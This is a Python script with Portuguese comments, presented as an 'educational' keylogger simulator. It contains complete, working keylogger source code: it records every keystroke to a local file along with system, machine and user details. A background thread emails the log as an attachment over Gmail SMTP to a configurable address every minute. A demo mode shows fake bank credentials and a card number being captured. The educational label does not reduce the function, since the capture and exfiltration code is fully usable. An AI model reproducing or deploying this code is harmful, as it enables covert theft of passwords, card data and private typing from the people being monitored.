"""
=============================================================
  KEYLOGGER SIMULADO - FINS EDUCACIONAIS APENAS
=============================================================
  Este script demonstra o funcionamento de um keylogger
  para fins de APRENDIZADO em cibersegurança.
  Execute APENAS em sua própria máquina, com sua permissão.
=============================================================
"""

import threading
import time
import datetime
import os
import smtplib
import platform
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

try:
    from pynput import keyboard
    PYNPUT_DISPONIVEL = True
except ImportError:
    PYNPUT_DISPONIVEL = False
    print("[!] pynput não instalado. Usando modo de demonstração.")
    print("    Instale com: pip install pynput")

# ─── Configurações ────────────────────────────────────────────
LOG_FILE       = Path("./keylog.txt")          # Arquivo de log local
ENVIO_INTERVAL = 60                            # Intervalo de envio por e-mail (segundos)
EMAIL_REMETENTE = "seu_email@gmail.com"        # E-mail do atacante (simulação)
EMAIL_SENHA     = "sua_senha_app"              # Senha de app Gmail
EMAIL_DESTINO   = "destino@email.com"          # Onde os logs chegam

# ─── Estado global ────────────────────────────────────────────
teclas_buffer  = []
tempo_inicio   = datetime.datetime.now()
total_teclas   = 0


def formatar_tecla(tecla) -> str:
    """Converte objeto de tecla em string legível."""
    try:
        return tecla.char  # Tecla alfanumérica normal
    except AttributeError:
        # Teclas especiais
        mapeamento = {
            "Key.space":     " ",
            "Key.enter":     "\n[ENTER]\n",
            "Key.backspace":  "[BACK]",
            "Key.tab":       "[TAB]",
            "Key.shift":     "",
            "Key.shift_r":   "",
            "Key.ctrl_l":    "[CTRL]",
            "Key.ctrl_r":    "[CTRL]",
            "Key.alt_l":     "[ALT]",
            "Key.alt_r":     "[ALT]",
            "Key.caps_lock": "[CAPS]",
            "Key.delete":    "[DEL]",
            "Key.esc":       "[ESC]",
        }
        return mapeamento.get(str(tecla), f"[{str(tecla).replace('Key.','')}]")


def salvar_log(texto: str):
    """Appenda teclas no arquivo de log com timestamp."""
    global total_teclas
    total_teclas += 1
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(texto)


def registrar_cabecalho():
    """Registra info do sistema no início da sessão."""
    info = f"""
╔══════════════════════════════════════════════════════╗
║          SESSÃO INICIADA — KEYLOGGER DEMO            ║
╚══════════════════════════════════════════════════════╝
  Data/Hora : {tempo_inicio.strftime("%d/%m/%Y %H:%M:%S")}
  Sistema   : {platform.system()} {platform.release()}
  Máquina   : {platform.node()}
  Usuário   : {os.getenv('USERNAME') or os.getenv('USER', 'desconhecido')}
══════════════════════════════════════════════════════
"""
    salvar_log(info)
    print(info)


def ao_pressionar(tecla):
    """Callback chamado a cada tecla pressionada."""
    caractere = formatar_tecla(tecla)
    if caractere:
        teclas_buffer.append(caractere)
        salvar_log(caractere)


def ao_soltar(tecla):
    """Callback chamado quando tecla é solta — detecta saída."""
    if tecla == keyboard.Key.f12:
        print("\n[+] F12 pressionado — encerrando keylogger.")
        return False  # Para o listener


def enviar_email():
    """Envia o log por e-mail periodicamente (simulação)."""
    while True:
        time.sleep(ENVIO_INTERVAL)
        if not LOG_FILE.exists():
            continue
        try:
            msg = MIMEMultipart()
            msg["From"]    = EMAIL_REMETENTE
            msg["To"]      = EMAIL_DESTINO
            msg["Subject"] = f"[KEYLOG] Captura — {datetime.datetime.now().strftime('%d/%m %H:%M')}"

            corpo = f"Log de teclas capturadas. Total: {total_teclas} teclas. Ver anexo."
            msg.attach(MIMEText(corpo, "plain"))

            with open(LOG_FILE, "rb") as f:
                parte = MIMEBase("application", "octet-stream")
                parte.set_payload(f.read())
                encoders.encode_base64(parte)
                parte.add_header("Content-Disposition", f"attachment; filename=keylog.txt")
                msg.attach(parte)

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
                servidor.login(EMAIL_REMETENTE, EMAIL_SENHA)
                servidor.send_message(msg)

            print(f"[+] Log enviado por e-mail em {datetime.datetime.now().strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"[!] Falha no envio de e-mail: {e}")
            print("    (Configure EMAIL_REMETENTE, EMAIL_SENHA e EMAIL_DESTINO para ativar)")


def modo_demonstracao():
    """Simula captura de teclas sem pynput (apenas para visualização)."""
    print("\n[MODO DEMONSTRAÇÃO — sem captura real de teclado]")
    print("Simulando digitação de texto fictício...\n")

    texto_simulado = [
        ("Acessando banco:", "www.bancobrasil.com.br\n"),
        ("Login:", "usuario123\n"),
        ("Senha:", "minha_senha_secreta_2024\n"),
        ("Cartão:", "4111 1111 1111 1111\n"),
        ("CVV:", "123\n"),
    ]

    registrar_cabecalho()
    for campo, valor in texto_simulado:
        print(f"  [Simulando] {campo} {valor.strip()}")
        salvar_log(f"\n[CAMPO: {campo}] {valor}")
        time.sleep(0.5)

    print(f"\n[+] Simulação concluída. Log salvo em: {LOG_FILE}")
    print(f"[+] Conteúdo capturado:\n")
    print(LOG_FILE.read_text(encoding="utf-8"))


def iniciar_keylogger_real():
    """Inicia captura real de teclado com pynput."""
    registrar_cabecalho()
    print("[*] Keylogger ativo. Pressione F12 para encerrar.")
    print(f"[*] Logs salvos em: {LOG_FILE}\n")

    # Thread de envio por e-mail em background
    thread_email = threading.Thread(target=enviar_email, daemon=True)
    thread_email.start()

    with keyboard.Listener(on_press=ao_pressionar, on_release=ao_soltar) as listener:
        listener.join()

    print(f"\n[+] Sessão encerrada. Total de teclas: {total_teclas}")
    print(f"[+] Log completo em: {LOG_FILE}")


def main():
    print("\n" + "="*60)
    print("  SIMULADOR DE KEYLOGGER — USO EDUCACIONAL")
    print("="*60)
    print("  1. Modo demonstração (sem captura real)")
    if PYNPUT_DISPONIVEL:
        print("  2. Captura real (pressione F12 para parar)")
    print("  3. Visualizar log atual")
    print("  4. Limpar log")
    print("  5. Sair")
    print("="*60)
    opcao = input("  Escolha: ").strip()

    if opcao == "1":
        modo_demonstracao()
    elif opcao == "2" and PYNPUT_DISPONIVEL:
        iniciar_keylogger_real()
    elif opcao == "3":
        if LOG_FILE.exists():
            print(f"\n--- Conteúdo de {LOG_FILE} ---\n")
            print(LOG_FILE.read_text(encoding="utf-8"))
        else:
            print("[!] Arquivo de log não encontrado.")
    elif opcao == "4":
        LOG_FILE.unlink(missing_ok=True)
        print("[+] Log removido.")
    elif opcao == "5":
        pass
    else:
        print("[!] Opção inválida ou pynput não disponível.")


if __name__ == "__main__":
    main()
